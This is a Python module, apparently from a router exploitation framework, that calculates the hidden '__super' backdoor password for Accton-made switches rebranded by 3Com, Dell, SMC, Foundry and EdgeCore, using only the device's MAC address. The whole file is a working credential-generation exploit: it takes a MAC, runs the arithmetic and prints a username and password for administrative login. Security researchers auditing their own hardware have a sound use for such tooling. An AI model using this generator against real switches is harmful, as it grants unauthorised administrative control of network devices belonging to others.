# Name:Accton-based switches (3com, Dell, SMC, Foundry and EdgeCore) - Backdoor Password
# File:switch_backdoor_gen.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 29.3.2015
# Last modified: 29.3.2015
# Shodan Dork:
# Description: The Accton company builds switches, which are rebranded and sold by several manufacturers.
# The backdoor password can be calculated if you have the switch MAC-address.
# Based on http://www.exploit-db.com/exploits/14875/ and routerpwn.com

import core.Misc
import core.io
from interface.utils import validate_mac, lookup_mac
from interface.messages import print_success, print_error, print_help, print_info


class Misc(core.Misc.RextMisc):
    """
Name:Accton-based switches (3com, Dell, SMC, Foundry and EdgeCore) - Backdoor Password
File:switch_backdoor_gen.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 29.3.2015
Description: The Accton company builds switches, which are rebranded and sold by several manufacturers.
    The backdoor password can be calculated if you have the switch MAC-address.
Based on http://www.exploit-db.com/exploits/14875/ and routerpwn.com

Options:
    Name        Description

    mac         MAC address used as input for password generation
    """
    mac = "00:00:00:00:00"
    password = ""

    def __init__(self):
        core.Misc.RextMisc.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        if args[0] == "mac":
            if validate_mac(args[1]):
                self.mac = args[1]
                print_info("MAC set to: " + self.mac + " " + lookup_mac(self.mac))
            else:
                print_error("provide valid MAC address")

    def do_mac(self, e):
        print_info(self.mac)

    def help_set(self):
        print_help("Set value of variable: \"set mac 00:11:22:33:44:55\"")

    def help_mac(self):
        print_help("Prints value of variable MAC")

    def do_run(self, e):
        mac_array = self.mac.split(":")
        counter = 0
        for i in mac_array:
            mac_array[counter] = int(i, 16)
            counter += 1

        counter = 0
        while counter < 5:
            char = mac_array[counter] + mac_array[counter+1]
            self.printchar(char)
            counter += 1

        counter = 0
        while counter < 3:
            char = mac_array[counter] + mac_array[counter+1] + 0xF
            self.printchar(char)
            counter += 1
        print_success('credentials generated')
        print("Username: __super")
        print("Password: " + self.password)

    def printchar(self, char):
        char %= 0x4B
        if char <= 9 or (char > 0x10 and char < 0x2a) or char > 0x30:
            self.password += chr(char + 0x30)
        else:
            self.password += "!"

Misc()
